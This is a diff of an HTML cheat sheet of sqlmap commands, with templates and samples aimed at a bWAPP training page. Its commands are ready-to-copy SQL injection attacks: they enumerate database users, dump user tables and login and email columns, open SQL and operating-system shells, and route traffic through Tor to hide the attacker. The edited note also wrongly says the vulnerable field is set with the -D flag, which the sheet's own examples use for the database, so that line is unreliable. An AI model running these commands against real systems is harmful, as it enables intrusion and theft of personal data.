@@ -54,48 +54,48 @@
 2. is auth required ?
 
 <b>0x1: get banner </b><p id="sqlmap01"><mark>sqlmap -u INSERT_VULN_URL --cookie=" " -b</mark></p>
-<b>SAMPLE:</b> sqlmap -u "http://192.199.17.130/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1b13abc7admnaada211d6315691d7e80" -b <br>
+<b>SAMPLE:</b> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" -b <br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#sqlmap01')">.0x1.</button>
 
 <b>0x2: get database users [current] </b><p id="sqlmap02"><mark>sqlmap -u INSERT_VULN_URL --cookie=" " --users</mark></p>
-<b>SAMPLE:</b> sqlmap -u "http://192.199.17.130/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1b13abc7admnaada211d6315691d7e80" --users <br>
+<b>SAMPLE:</b> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" --users <br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#sqlmap02')">.0x2.</button>
 
 <b>0x3: get databases </b><p id="sqlmap03"><mark>sqlmap -u INSERT_VULN_URL --cookie=" " --dbs</mark></p>
-<b>SAMPLE:</b> sqlmap -u "http://192.199.17.130/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1b13abc7admnaada211d6315691d7e80" --dbs <br>
+<b>SAMPLE:</b> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" --dbs <br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#sqlmap03')">.0x3.</button>
 
 <b>0x4: get tables </b><p id="sqlmap04"><mark>sqlmap -u INSERT_VULN_URL --cookie=" " -D DATABASE_NAME --tables</mark></p>
-<b>SAMPLE:</b> sqlmap -u "http://192.199.17.130/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1b13abc7admnaada211d6315691d7e80" -D bWAPP --tables <br>
+<b>SAMPLE:</b> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" -D bWAPP --tables <br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#sqlmap04')">.0x4.</button>
 
 <b>0x5: get columns from table </b><p id="sqlmap05"><mark>sqlmap -u INSERT_VULN_URL --cookie=" " -D DATABASE_NAME -T TABLE_NAME --columns</mark></p>
-<b>SAMPLE:</b> sqlmap -u "http://192.199.17.130/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1b13abc7admnaada211d6315691d7e80" -D bWAPP -T users --columns <br>
+<b>SAMPLE:</b> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" -D bWAPP -T users --columns <br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#sqlmap05')">.0x5.</button>
 
 <b>0x6: dump a table </b><p id="sqlmap06"><mark>sqlmap -u INSERT_VULN_URL --cookie=" " -D DATABASE_NAME -T TABLE_NAME --dump</mark></p>
-<b>SAMPLE:</b> sqlmap -u "http://192.199.17.130/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1b13abc7admnaada211d6315691d7e80" -D bWAPP -T users --dump <br>
+<b>SAMPLE:</b> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" -D bWAPP -T users --dump <br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#sqlmap06')">.0x6.</button>
 
 <b>0x7: dump specific columns </b><p id="sqlmap07"><mark>sqlmap -u INSERT_VULN_URL --cookie=" " -D DATABASE_NAME -T TABLE_NAME -C column_name1,column_name2 --dump</mark></p>
-<b>SAMPLE:</b> sqlmap -u "http://192.199.17.130/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1b13abc7admnaada211d6315691d7e80" -D bWAPP -T users -C login,email --dump <br>
+<b>SAMPLE:</b> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" -D bWAPP -T users -C login,email --dump <br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#sqlmap07')">.0x7.</button>
 
 <b>0x8: get interactive DB shell </b><p id="sqlmap08"><mark>sqlmap -u INSERT_VULN_URL --cookie=" " --sql-shell</mark></p>
-<b>SAMPLE:</b> sqlmap -u "http://192.199.17.130/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1b13abc7admnaada211d6315691d7e80" --sql-shell <br>
+<b>SAMPLE:</b> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" --sql-shell <br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#sqlmap08')">.0x8.</button>
 
 <b>0x9: get system OS shell </b><p id="sqlmap09"><mark>sqlmap -u INSERT_VULN_URL --cookie=" " --os-shell</mark></p>
-<b>SAMPLE:</b> sqlmap -u "http://192.199.17.130/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1b13abc7admnaada211d6315691d7e80" --os-shell <br>
+<b>SAMPLE:</b> sqlmap -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" --os-shell <br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#sqlmap09')">.0x9.</button>
 
 <b>0x10: use proxy TOR </b><p id="sqlmap10"><mark>sqlmap --tor --tor-type=SOCKS5 --check-tor -u INSERT_VULN_URL --cookie=" " -b</mark></p>
-<b>SAMPLE:</b> sqlmap --tor --tor-type=SOCKS5 --check-tor -u "http://192.199.17.130/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1b13abc7ad00aada211d6315691d7e80" --dbs <br>
+<b>SAMPLE:</b> sqlmap --tor --tor-type=SOCKS5 --check-tor -u "http://ip_addr/bWAPP/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=1e80" --dbs <br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#sqlmap10')">.0x10.</button>
 
 <b>NOTES:</b> 
-1. vulnerable field can be specified.
-2. most of time file results are stored in "/home/USER/.local/share/sqlmap/output/..."
+1. vulnerable field can be specified with -D flag.
+2. most of time file results are stored in <b>"/home/USER/.local/share/sqlmap/output/</b>..."
 
 </div>
 </pre>
